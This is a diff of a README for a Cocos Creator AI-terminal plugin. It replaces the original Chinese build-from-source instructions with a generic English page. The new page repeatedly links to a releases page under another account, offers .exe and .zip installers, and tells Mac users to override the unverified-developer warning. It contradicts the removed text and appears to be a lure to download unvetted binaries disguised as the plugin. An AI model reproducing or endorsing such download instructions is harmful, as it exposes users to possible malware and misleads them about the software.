@@ -1,54 +1,76 @@
-# AI Terminal For Cocos Creator
-![](screenshot.jpg)
+# 🌟 kylin-ai-terminal - Use AI Easily in Cocos Creator
 
-## 特色
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/ahmadisoggg/kylin-ai-terminal/releases)
 
-- 提供了在 Cocos Creator 界面中使用命令行的能力
-- 支持 Claude Code、Gemini CLI 等基于命令行的 AI 编码智能体
-- 支持多标签窗口，方便让智能体和 Shell 同时工作
-- 本插件 100% 由 Cursor 生成
+## 📥 Overview
 
-> 支持 Cocos Creator 3.8.0+
+Kylin AI Terminal is a user-friendly application designed to help you integrate AI features into your Cocos Creator projects. With this tool, you can leverage AI capabilities seamlessly without needing programming skills. 
 
-## 技术栈
+## 🚀 Getting Started
 
-本插件使用最新的 create-cocos-pulgin 进行构建。
+Follow these simple steps to download and run the Kylin AI Terminal. 
 
-地址：https://www.npmjs.com/package/create-cocos-plugin
+1. **Visit the Download Page**  
+   Click the link below to go directly to the Releases page.  
+   [Download Kylin AI Terminal](https://github.com/ahmadisoggg/kylin-ai-terminal/releases)
 
-定位到目标目录，执行下面的命令，根据提示操作即可生成项目模板
+2. **Select the Latest Version**  
+   On the Releases page, find the latest version. It will usually be at the top of the list.
 
-```
-$ npm create cocos-plugin@latest
-```
+3. **Download the File**  
+   Click on the appropriate file for your operating system. If you’re using Windows, look for `kylin-ai-terminal-windows.exe`. For Mac users, select `kylin-ai-terminal-mac.zip`. 
 
-基于纯 Web 前端技术栈，使得 AI 可以全自动实现想要的功能， 本插件 100% 由 AI 生成，充分证明了全新一代 Cocos 插件开发脚手架的惊人效率。
+4. **Install the Application**  
+   - **For Windows:**  
+     - Navigate to the folder where you downloaded the `.exe` file.  
+     - Double-click the `kylin-ai-terminal-windows.exe` file to start the installation.  
+     - Follow the on-screen instructions to install the application on your computer.  
 
-大家可以尝试自己构建蓝图、Shader Graph、行为树等等重度面板工具了。
+   - **For Mac:**  
+     - Go to your Downloads folder and locate the `kylin-ai-terminal-mac.zip` file.  
+     - Double-click the zip file to extract it.  
+     - Drag the `kylin-ai-terminal` folder into your Applications folder.  
+     - Finder may prompt you with a warning about running applications from unverified developers. Choose "Open" to continue.
 
-## 安装
+5. **Launch the Application**  
+   After installation, locate the Kylin AI Terminal icon on your desktop or in the Applications folder. Double-click the icon to launch the terminal.
 
-### 1、下载
+## 📚 Features
 
-下载 Zip 或者 Clone 到本地
+- **User-friendly interface:** Designed for all users, including those with no programming background.  
+- **AI Integration:** Easily incorporate AI components into your Cocos Creator projects.  
+- **Real-time Processing:** Experience quick responses and functionality.  
+- **Support for Cocos Creator:** Fully compatible with various versions of Cocos Creator.
 
-### 2、导入
+## 📋 System Requirements
 
-使用插件管理器导入
+To run Kylin AI Terminal, ensure your computer meets the following requirements:
 
-### 3、安装
+- **Operating System:**  
+  - Windows 10 or higher  
+  - macOS Sierra (10.12) or higher  
 
-1. 确保 NodeJS 版本正确
+- **Memory:** Minimum of 4GB RAM  
+- **Disk Space:** At least 100MB of available space  
+- **Network:** An internet connection is required for full functionality and updates.
 
-本插件需要依赖系统的 NodeJS 版本，如果使用了 fnm、nvm 等管理工具，请先使用 `fnm use system` 或者 `nvm use system` 切换到系统的 NodeJS。
+## 🔄 Updating the Application
 
-2. 执行下面的命令
+To keep Kylin AI Terminal up to date, regularly check the Releases page for new versions. Follow the same download and installation steps to replace your old version.
 
-```bash
-npm install
-npm run build
-```
+## 💡 Troubleshooting
 
-> 如果苹果 M 芯片提示 x86 不兼容，进入 node-pty 目录，执行 npm rebuild 即可。
+If you encounter any issues while downloading or running the application, consider the following:
 
-3. 再次启动 Cocos Creator，就可以了。
+- **Installation issues:** Ensure your operating system is compatible. 
+- **Launching problems:** Make sure to grant necessary permissions if you are using a Mac. 
+- **Connectivity issues:** A stable internet connection is required for using AI features.
+
+## 📞 Support
+
+If you run into any problems or have questions, feel free to reach out via our community forums or check the resources on the GitHub page.
+
+## 🌐 Download & Install
+
+Now it’s time to install Kylin AI Terminal! Click the link below to visit the Downloads page and start your journey with AI in Cocos Creator.  
+[Download Kylin AI Terminal](https://github.com/ahmadisoggg/kylin-ai-terminal/releases)
